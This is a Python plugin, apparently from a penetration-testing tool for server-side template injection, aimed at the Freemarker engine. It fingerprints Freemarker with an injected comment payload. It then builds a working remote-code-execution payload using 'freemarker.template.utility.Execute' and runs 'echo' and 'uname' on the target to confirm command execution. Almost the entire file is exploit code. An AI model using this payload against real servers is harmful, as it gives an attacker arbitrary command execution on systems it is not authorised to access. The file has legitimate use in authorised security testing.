from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Freemarker(Check):

    render_tag = '${%(payload)s}'
    header_tag = '${%(header)s}'
    trailer_tag = '${%(trailer)s}'
    contexts = [
        { 'level': 1, 'prefix': '}', 'suffix' : '${' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.inject(payload):
            self.set('language', 'java')
            self.set('engine', 'freemarker')

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)
            self.set('os', self.execute("uname"))


    def execute(self, command):

        # TODO: quote command
        return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (command))
